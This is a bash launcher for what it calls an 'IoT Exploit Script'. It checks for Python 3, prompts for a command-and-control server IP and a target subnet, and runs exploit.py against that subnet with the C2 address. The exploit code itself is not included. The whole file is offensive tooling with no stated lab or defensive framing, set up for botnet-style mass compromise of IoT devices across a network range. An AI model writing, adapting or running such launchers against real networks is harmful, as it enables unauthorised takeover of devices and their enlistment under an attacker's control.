#!/bin/bash
# IoT Exploit Script - Launcher
echo "==================================================="
echo "IoT Exploit Script"
echo "==================================================="
echo ""

# Check for Python installation
if ! command -v python3 &> /dev/null; then
    echo "ERROR: Python 3 is not installed or not in PATH"
    echo "Please install Python 3.9+ and try again"
    exit 1
fi

# Check for command line arguments
if [ -z "$1" ]; then
    echo "Usage: $0 [C2_SERVER_IP] [SUBNET]"
    echo "Example: $0 127.0.0.1 192.168.1.0/24"
    read -p "Enter C2 server IP (default: 127.0.0.1): " C2_SERVER_IP
    
    if [ -z "$C2_SERVER_IP" ]; then
        C2_SERVER_IP="127.0.0.1"
    fi
else
    C2_SERVER_IP="$1"
fi

if [ -z "$2" ]; then
    read -p "Enter target subnet (default: 11.10.10.0/24): " SUBNET
    
    if [ -z "$SUBNET" ]; then
        SUBNET="11.10.10.0/24"
    fi
else
    SUBNET="$2"
fi

echo ""
echo "Starting exploit script..."
echo "C2 Server IP: $C2_SERVER_IP"
echo "Target Subnet: $SUBNET"
echo ""

python3 exploit.py --cnc $C2_SERVER_IP --subnet $SUBNET
